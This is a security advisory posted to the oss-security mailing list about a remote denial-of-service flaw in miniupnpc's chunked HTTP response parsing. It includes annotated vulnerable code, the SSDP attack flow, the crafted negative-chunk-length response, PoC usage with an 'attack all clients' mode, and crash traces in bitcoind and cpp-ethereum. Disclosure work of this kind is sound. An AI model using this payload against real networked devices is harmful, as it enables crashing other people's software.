  oss-security - - miniupnpc integer signedness error when parsing a chunked encoded http response            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [day] [month] [year] [list]  Date: Thu, 11 May From: "oststrom \(public\)" <pub@...strom.com> To: <fulldisclosure@...lists.org>, 	<oss-security@...ts.openwall.com> Subject: - miniupnpc integer signedness error when parsing a chunked encoded http response   Author:     <github.com/tintinweb> Ref:        Version:    0.6 Date:       May 1st,  Tag:        miniupnp miniupnpc getHTTPResponse chunked encoding integer signedness error  Overview --------  Name:           miniupnpc Vendor:         Thomas Bernard References:     * http://miniupnp.free.fr/ [1]  Version:        v2.0 [2] Latest Version: [2][3] Other Versions: >= [2] (released ~6 years ago) Platform(s):    cross Technology:     c  Vuln Classes:   Origin:         remote Min. Privs.:    ---  CVE:              Description ---------  quote website [1]  >UPnP IGD client lightweight library and UPnP IGD daemon >The UPnP protocol is supported by most home adsl/cable routers and  Microsoft Windows 2K/XP. The aim of the MiniUPnP project is to bring a  free software solution to support the "Internet Gateway Device" part of  the protocol. The MediaServer/MediaRenderer UPnP protocol (DLNA) is also  becoming very popular but here we are talking about IGD. ReadyMedia  (formely known as MiniDLNA) is a UPnP Media Server using some UPnP code  from MiniUPnPd.  miniupnp is part of many applications / embedded network devices  * P2P File Sharing software * Network Device Firmware * Blockchain clients * ...   Summary -------  *TL;DR - one-click crash miniupnpc based applications on your network*  #### Integer signedness error in miniupnpc allows remote attackers to cause a denial of service condition via specially crafted HTTP response  An integer signedness error was found in miniupnp's `miniwget` allowing an unauthenticated remote entity typically located on the local network segment to trigger a heap corruption or an access violation in miniupnp's http response parser when processing a specially crafted chunked-encoded response to a request for the xml root description url.  To exploit this vulnerability, an attacker only has to provide a chunked-encode HTTP response with a negative chunk length to upnp  clients requesting a resource on the attackers webserver. Upnp clients  can easily be instructed to request resources on the attackers webserver by answering SSDP discovery request or by issueing SSDP service  notifications (low complexity, integral part of the protocol).    * remote, unauthenticated, `ACCESS_VIOLATION_READ` and heap corruption * (confirmed) DoS; (unconfirmed) other impacts   see attached PoC see proposed patch  Details -------  The vulnerable component is a HTTP file download method called  `miniwget` (precisely `getHTTPResponse`) that fails to properly handle invalid chunked-encoded HTTP responses. The root cause is a bounds check that mistakenly casts an unsigned attacker-provided chunksize to signed int leading to an incorrect decision on the destination heap buffer size when copying data from the server response to an internal buffer. The attacker controls both the size of the internal buffer as well as the number of bytes to copy. In order for this attack to succeed, the number of bytes to copy must be negative.  attacker controls: * `int content_length` * `unsigned int chunksize` * `bytestocopy` if `(int) chunksize` is negative (or at least < `n-i` ~ bytes) * length of `content_buf` if `bytestocopy` is negative  In the end, the attacker controls * `realloc(content_buf, content_length)` * `memcpy(content_buf+x, http_response, chunksize)`   client (miniupnpc)                         server (poc.py)     |                                         |     |                                         |     | SSDP:  Discovery - M-SEARCH             | 1.  | --------------------------------------> |     |                                         |     | SSDP:  Reply - Location Header          | 2.  | <-------------------------------------- |     |                                         |     |        GET (Location Header/xxxx.xml)   | 3.  | --------------------------------------> |     |                                         |     |        HTTP chunked-encoded reply       | 4.  | <-------------------------------------- |     |                                         |  1. application performs SSDP discovery via M-SEARCH (multicast, local network    segment) 2. poc.py responds with the url to the xml root description requesting the    application to navigate to the malicious webserver. 3. application requests xml root description url (taken from reply to M-SEARCH,    Location Header) on malicious webserver (poc.py) 4. poc.py responds with a specially crafted http response triggering the heap    overwrite in miniupnp  #### Source  *Note:* Inline annotations are prefixed with //#! *Note:* This is a stripped down version of the vulnerable code. For full details         see  [4]  * A) 1. to 3. is the parsing of the chunksize * B) 4. to 5. integer signedness error * C) 6. integer wrapping * D) 7. to 9. destination buffer size * E) 10. heap overwrite with size in bytestocopy  ... //#! 4) //#!   goal: a) bytestocopy becomes negative due to chunksize being negative //#!         b) content_length defines destination buffer size //#!         c) overwrite destination heap buffer content_buf[content_length] with bytestocopy bytes from request //#!            memcopy(content_buf[content_length], req_body, (unsigned)bytestocopy) //#! bytestocopy = ((int)chunksize < (n - i))?chunksize:(unsigned int)(n - i);   //#! 5) boom! - bytestocopy becomes chunksize since chunksize is negative (e.g. -1) if((content_buf_used + bytestocopy) > content_buf_len)                      //#! 6) true, since bytestocopy is negative, wraps unsigned content_buf_used {     char * tmp;     if(content_length >= (int)(content_buf_used + bytestocopy)) {           //#! 7) content_length is attacker controlled.         content_buf_len = content_length;                                   //#! 8) we want content_length to define our dst buffer size (e.g. 1)     } else {                                                                 //#!   if we dont hit this, content_buf_len would likely be ~2k         content_buf_len = content_buf_used + bytestocopy;     }     tmp = realloc(content_buf, content_buf_len);                            //#! 9) realloc to content_length bytes (e.g.     if(tmp == NULL) {         /* memory allocation error */         free(content_buf);         free(header_buf);         *size = -1;         return NULL;     }     content_buf = tmp; } memcpy(content_buf + content_buf_used, buf + i, bytestocopy);               //#! 10) boom heap overwrite with bytesttocopy bytes (e.g. (unsigned)-1) to content_length (e.g. sized buffer content_buf_used += bytestocopy;                                            //#!     (also an out of bounds ready since it has not been checked if buf holds enough bytes) i += bytestocopy; chunksize -= bytestocopy;   #### Taint Graph  basically all `miniwget*` and `UPNP_*` methods.  * getHTTPResponse (vulnerable)  * miniwget3   * miniwget2    * miniwget    * miniwget_getaddr     * UPNP_GetIGDFromUrl     * UPNP_GetValidIGD      * UPnP_selectigd  * UPNP_Get*  * UPNP_Check*  * UPNP_Delete*  * UPNP_Update*  * UPNP_Add*   #### Scenarios  The PoC can be configured for three scenarios:  ##### 1) SCENARIO_CRASH_LARGE_MEMCPY  Similar to 3) attempts to smash the heap but likely fails with an `ACCESS_VIOLATION_READ` when trying to read from an non-accessible memory region.  details see [7]  ##### 2) SCENARIO_CRASH_REALLOC_NULLPTR  Miniupnp v1.8 was missing an error check for `realloc` which can be used to cause a DoS condition when making `realloc` fail while allocating a large chunk of data. When `realloc` fails - because the requested size of memory cannot be allocated - it returns a `nullptr`. Miniupnp ~1.8 was missing a check for the `nullptr` and tried to `memcpy` bytes from the attackers http response to that `nullptr` which fails with an `ACCESS_VIOLATION`.  To provoke this scenario one must provide an arbitrarily large `content_length` (e.g. `0x7fffffff` likely fails on 32 bits) and make `memcpy` attempt to copy a byte to that location.   ##### 3) SCENARIO_CRASH_1_BYTE_BUFFER  The idea is to create a small heap buffer and overwrite it with a large chunk of data. This can be achieved by instructing miniupnp to `realloc` `content_buf` to a size of `1 byte` by providing a `content-length` of `1`. To overwrite this 1 byte buffer the attacker provides a negative chunksize e.g. Depending on the implementation of `memcpy` and the memory layout `memcpy` will either fail with a `ACCESS_VIOLATION_READ` as we're only providing <= bytes with the server response and will most certainly hit a non-accessible memory region while copying bytes or the application crashes because of a heap corruption.  Here's an example of `miniupnpc` corrupting the heap when compiled for 32 bit platforms.   Ă˘Âş    call   memcpy@plt                        dest: Ă˘Ă˘ 0x0                    //#! <--- size 1 - attacker controlled content_buf     src: Ă˘Ă˘ ('AAAA')    //#! <--- attacker controlled http response     n:                             //#! <--- attacker controlled (must be negative) bytestocopy  pwndbg> i lo i = 30 buf = "f\r\n<xml>BOOM</x"... n = <optimized out> endofheaders = 91 chunked = 1 content_length = 1 chunksize = bytestocopy =                          //#! <--- nr of bytes to copy from buf header_buf = "HTTP/1.1 OK"... header_buf_len = header_buf_used = <optimized out> content_buf = content_buf_len = 1                               //#! <--- destination, realloc'd to 1 content_buf_used = 15 chunksize_buf = chunksize_buf_index = <optimized out> reason_phrase = 0x0 reason_phrase_len = 0  //#! ### before memcpy pwndbg> hexdump content_buf  3c 78 6d 6c  3e 42 4f 4f  4d 3c 2f 78  e9 07 02 00  Ă˘<xmlĂ˘>BOOĂ˘M</xĂ˘....Ă˘  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  Ă˘....Ă˘....Ă˘....Ă˘....Ă˘ ...  00 00 00 00                                         Ă˘....Ă˘    Ă˘    Ă˘    Ă˘  //#! ### after memcpy pwndbg> hexdump content_buf  3c 78 6d 6c  3e 42 4f 4f  4d 3c 2f 78  e9 07 02 41  Ă˘<xmlĂ˘>BOOĂ˘M</xĂ˘...AĂ˘  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  Ă˘AAAAĂ˘AAAAĂ˘AAAAĂ˘AAAAĂ˘ ...  41 41 41 41                                         Ă˘AAAAĂ˘    Ă˘    Ă˘    Ă˘   Proof of Concept ----------------  Prerequisites:  * any software that compiles with `miniupnpc`, calls `miniwget.c::miniwget()`   or any of the `UPNP_` methods - e.g. bitcoind (with -upnp), qBittorrent   on startup * `poc.py`, python 2.7, tested on windows and linux  (disable firewall or allow inbound  Usage:  usage: poc.py [options]             example: poc.py --listen [--havoc | --target <ip> [<ip>..]]    optional arguments:   -h, --help            show this help message and exit   -q, --quiet           be quiet [default: False]   -l LISTEN, --listen LISTEN                         local httpserver listen ip:port. Note:                         is not allowed. This ip is being used in the SSDP                         response Location header.   -u USN, --usn USN     Unique Service Name.   -t [TARGET [TARGET ...]], --target [TARGET [TARGET ...]]                         Specify a list of client-ips to attack. Use --havoc to                         attempt to crash all clients.   -z, --havoc           Attempt to attack all clients connecting to our http                         server. Use at your own risk.  run PoC  * local listen ip:port for the malicious web server: (your_local_ip) * only attempt to crash client (use --havoc instead of --target to disable whitelist)  #> poc.py --listen --target  [poc.py -                 main() ][    INFO]      _  _    _____ _____ _____ _____   / |/ |  |  |  |  _  |   | |  _  |            ___ ___    _____ ___ ___ ___  / // /   |  |  |   __| | | |   __|   _ _ _   |   | . |  |     | . |  _| -_| |_/|_/    |_____|__|  |_|___|__|     |_|_|_|  |_|_|___|  |_|_|_|___|_| |___                                                        //github.com/tintinweb       [mode  ]     â  filter (targeting     [listen]     đ (local http server listening ip)     [usn   ]     âš uuid:deadface-dead-dead-dead-cafebabed00d::upnp:rootdevice  [poc.py -                 main() ][   DEBUG] spawning webserver: <BadHttpServer [poc.py -             __init__() ][   DEBUG] [SSDP] bind: [poc.py -               listen() ][    INFO] [HTTP] bind [poc.py -             __init__() ][   DEBUG] [SSDP] add membership: [poc.py -    register_callback() ][   DEBUG] [SSDP] add callback for 'M-SEARCH' : <function handle_msearch at [poc.py -               listen() ][    INFO] [HTTP] waiting for connection [poc.py -    register_callback() ][   DEBUG] [SSDP] add callback for 'NOTIFY' : <function handle_notify at [poc.py -               listen() ][   DEBUG] [SSDP] listening... [poc.py -               listen() ][    INFO] [      ] connection from: [poc.py -               listen() ][   DEBUG] GET /xxxx.xml HTTP/1.1 Host: Connection: Close User-Agent: UPnP/1.1, MiniUPnPc/2.0   [poc.py -                 send() ][   DEBUG] HTTP/1.1 OK Transfer-Encoding: chunked Content-Length: Content-Type: text/html  f <xml>BOOM</xml> AAAAAAAAAAAAAAAA...         //#! Repeated 9k times. 3 bye 0 [poc.py -                 send() ][ WARNING] [----->] BOOM! payload delivered! - <HttpLikeMessage msg=('HTTP/1.1', 'OK') header={'Transfer-Encoding': 'chunked', 'Content-Length': 'Content-Type': 'text/html'} [poc.py -               listen() ][    INFO] waiting for connection   #### A) miniupnpc v2.0  [tin@...alhost miniupnpc]$ gdb --args ./upnpc-static  -u -d -s ... (gdb) r The program being debugged has been started already. Start it from the beginning? (y or n) y Starting program: /home/tin/miniupnp/miniupnpc/./upnpc-static -u -d -s upnpc : miniupnpc library test client, version 2.0.  (c) Thomas Bernard. Go to http://miniupnp.free.fr/ or http://miniupnp.tuxfamily.org/ for more information. parsed url : path='/xxxx.xml' scope_id=0 address miniwget : header='Transfer-Encoding', value='chunked' chunked transfer-encoding! header='Content-Length',                //#!  user provided content length (valid) Content-Length: header='Content-Type', value='text/html' chunksize = 15 (f) chunksize =                    //#!  user provided chunk size  Program received signal SIGSEGV, Segmentation fault. in __memcpy_ssse3_back () from (gdb) up #1  in getHTTPResponse (s=s@...ry=7, status_code=status_code@...ry=0x0) at          memcpy(content_buf + content_buf_used, buf + i, bytestocopy); (gdb) bt #0  in __memcpy_ssse3_back () from #1  in getHTTPResponse (s=s@...ry=7, status_code=status_code@...ry=0x0) at #2  in miniwget3 port=<optimized out>, "/xxxx.xml",     addr_str_len=addr_str_len@...ry=64, "1.1", scope_id=0, status_code=status_code@...ry=0x0)     at #3  in miniwget2 (status_code=0x0, scope_id=<optimized out>, addr_str_len=64, path=<optimized out>, port=<optimized out>,     at #4  miniwget_getaddr addrlen=addrlen@...ry=64,     scope_id=scope_id@...ry=0, status_code=status_code@...ry=0x0) at #5  in UPNP_GetIGDFromUrl     lanaddrlen=lanaddrlen@...ry=64) at #6  in main (argc=<optimized out>, at (gdb) i lo i = 30 buf = 'A' <repeats times>... n = endofheaders = 94 chunked = 1                      //#!  chunked-encoding mode content_length =            //#!  user provided content-length (valid) chunksize =           //#!  user provided chunk-size (invalid, bytestocopy =         //#!  is our chunk-size. used in call to memcpy as the number of bytes to copy. header_buf = "HTTP/1.1 OK\r\nTransfer-Encoding: chunked\r\nContent-Length: 'A' <repeats 76 times>... header_buf_len = header_buf_used = content_buf = "<xml>BOOM</xml>" content_buf_len =           //#!  has been reallocated to content-length (otherwise this would be ~2k) content_buf_used = 15 chunksize_buf = chunksize_buf_index = 0 reason_phrase = 0x0 reason_phrase_len = 0   #### B) cpp-ethereum  [tin@...alhost miniupnpc]$ gdb --args eth -v 9 ... (gdb) r Starting program: /usr/bin/eth -v 9 [Thread debugging using libthread_db enabled] Using host libthread_db library cpp-ethereum, a C++ Ethereum client ...   Reading /home/... Ă˘Â§ Ă˘     Âš   Id: [New Thread (LWP ...   Opened blockchain DB. Latest: (rebuild not needed) [New Thread (LWP ...   Opened state DB. [New Thread (LWP Ă˘Â§ÂŤ Ă˘   startedWorking() cpp-ethereum   By cpp-ethereum contributors, (c)   See the README for contributors and credits. Transaction Signer: - Mining Beneficiary: - Foundation: - [New Thread (LWP [New Thread (LWP   Ă˘    Âš   UPnP device: [st: urn:schemas-upnp-org:device:InternetGatewayDevice:1 ]  Program received signal SIGSEGV, Segmentation fault. [Switching to Thread (LWP in __memcpy_ssse3_back () from (gdb) #0  in __memcpy_ssse3_back () from #1  in getHTTPResponse () from #2  in miniwget3.constprop.0 () from #3  in miniwget () from #4  in dev::p2p::UPnP::UPnP() () from #5  in dev::p2p::Network::traverseNAT(std::set<boost::asio::ip::address, std::less<boost::asio::ip::address>, std::allocator<boost::asio::ip::address> > const&, unsigned short, boost::asio::ip::address&) () from #6  in dev::p2p::Host::determinePublic() () from #7  in dev::p2p::Host::startedWorking() () from #8  in dev::Worker::startWorking()::{lambda()#1}::operator()() const () from /lib64/libdevcore.so #9  in ?? () from #10 in start_thread () from #11 in clone () from   #### D) bitcoind (linux)  #> src\bitcoind -upnp -printtoconsole  pwndbg> bt #0  __memcpy_sse2_unaligned () at #1  in getHTTPResponse () from #2  in ?? () from #3  in miniwget_getaddr () from #4  in UPNP_GetValidIGD () from #5  in ThreadMapPort () at #6  in TraceThread<void (*)()> "upnp", <ThreadMapPort()>) at #7  in boost::_bi::list2<boost::_bi::value<char const*>, boost::_bi::value<void (*)()> >::operator()<void (*)(char const*, void (*)()), boost::_bi::list0> <TraceThread<void (*)()>(char const*, void (*)())>, a=...) at #8  in boost::_bi::bind_t<void, void (*)(char const*, void (*)()), boost::_bi::list2<boost::_bi::value<char const*>, boost::_bi::value<void (*)()> > >::operator() at /usr/include/boost/bind/bind_template.hpp:20 #9  in boost::detail::thread_data<boost::_bi::bind_t<void, void (*)(char const*, void (*)()), boost::_bi::list2<boost::_bi::value<char const*>, boost::_bi::value<void (*)()> > > >::run at #10 in ?? () from #11 in start_thread at #12 in clone () at   Mitigation / Workaround / Discussion -------------------------------------  * update to * disable upnp  *Note*: patch see [7]   Notes -----  * Vendor acknowledgement / Miniupnp Changelog [5] * Thanks to the miniupnp project for providing a fixed version within ~1 week! * This research/disclosure was coordinated in cooperation with the ethereum foundation at ethereum.org. Thanks, it was a pleasure working with you!   References ----------  [1] http://miniupnp.free.fr/ [2] http://miniupnp.free.fr/files/ [3] https://github.com/miniupnp/miniupnp/tree/master [4] [5] [6] [7]   Contact -------  https://github.com/tintinweb   Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      